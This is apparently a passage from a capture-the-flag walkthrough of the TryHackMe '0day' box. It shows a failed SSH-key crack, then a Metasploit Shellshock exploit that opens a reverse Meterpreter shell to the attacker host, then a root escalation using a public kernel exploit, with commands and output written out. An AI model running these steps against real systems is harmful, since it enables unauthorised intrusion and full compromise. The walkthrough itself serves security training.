`/backup/` have a SSH private key, Let's crack it for a password.
sh
```
bvr0n@kali:~/CTF/THM/0day$ sudo john test --wordlist=/home/bvr0n/Documents/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes.
Press 'q' or Ctrl-C to abort, almost any other key for status

This was eventually a rabbit hole haha, i decided to bring `nikto` he may help me :
sh
```

```
Nikto was able to find a vulnerability named `Shellshock - CVE-2014-6271`.

## Shellshock :

Also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014. 
Shellshock could enable an attacker to cause Bash to execute arbitrary commands and gain unauthorized access to many Internet-facing services, such as web servers, that use Bash to process requests. 

#### Specific exploitation vectors :

* CGI-based web server, Python, Perl
* OpenSSH server
* DHCP clients
* Qmail server
* IBM HMC restricted shell
* Vulnerable since version 1.03 of Bash released in September 1989

## Shellshock Exploitation :

I searched for it in metasploit and found 11 modules, but this one matches what we need :

```sh
   5   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)7
```
This is what we need to configure :

```
> set LHOST tun0
> set RHOSTS 10.10.86.209
> set TARGETURI /cgi-bin/test.cgi
```
Type exploit and wait for it :

```sh
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

[*] Started reverse TCP handler on 10.8.14.157:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (980808 bytes) to 10.10.86.209
[*] Meterpreter session 1 opened (10.8.14.157:4444 -> 10.10.86.209:55383) at 2020-11-10 16:09:04 -0500

```

## Privilege Escalation :

So i did a few enumeration and i found out that this machine is running an outdated kernel :o

```sh
www-data@ubuntu:/home/ryan$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

I searched for this version and i found this [Exploit](https://www.exploit-db.com/exploits/37292), so let's get this root.

I uploaded the exploit to the machine via my machine and compiled it, since we have `gcc` there :

```sh
www-data@ubuntu:/tmp$ gcc Kernel_exploit.c -o kec
www-data@ubuntu:/tmp$ ./kec 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id && whoami
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root
```

And now we are `root`, hope you learned something new.
